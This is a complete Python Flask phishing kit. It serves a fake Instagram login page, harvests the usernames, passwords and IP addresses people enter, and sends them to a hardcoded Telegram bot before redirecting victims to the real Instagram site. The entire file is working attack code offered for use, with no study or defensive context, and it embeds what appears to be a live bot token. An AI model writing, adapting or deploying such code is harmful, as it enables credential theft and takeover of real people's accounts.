import requests
from flask import Flask, request

BOT_TOKEN = "8528248141:AAHjKBWXN5E7DWmMlCOkEFYB-kL1kyVTwmE"
CHAT_ID   = "2028533085"

app = Flask(__name__)

def send_telegram(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text},
            timeout=5,
        )
    except:
        pass

html = """
<!DOCTYPE html>
<html>
<head>
<title>Instagram</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: Arial; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.box { background: white; border: 1px solid #ddd; padding: 40px; width: 300px; text-align: center; border-radius: 5px; }
h1 { font-family: cursive; font-size: 40px; margin-bottom: 30px; }
input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #ddd; border-radius: 3px; box-sizing: border-box; }
button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 5px; font-size: 16px; }
</style>
</head>
<body>
<div class="box">
<h1>Instagram</h1>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log in</button>
</form>
</div>
</body>
</html>
"""

@app.route("/")
def home():
    return html

@app.route("/login", methods=["POST"])
def login():
    u = request.form.get("username", "")
    p = request.form.get("password", "")
    ip = request.remote_addr

    send_telegram(
        f"🎯 New login captured!\n\n"
        f"👤 Username: {u}\n"
        f"🔑 Password: {p}\n"
        f"🌐 IP: {ip}"
    )

    return '<script>window.location.href="https://www.instagram.com"</script>'

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
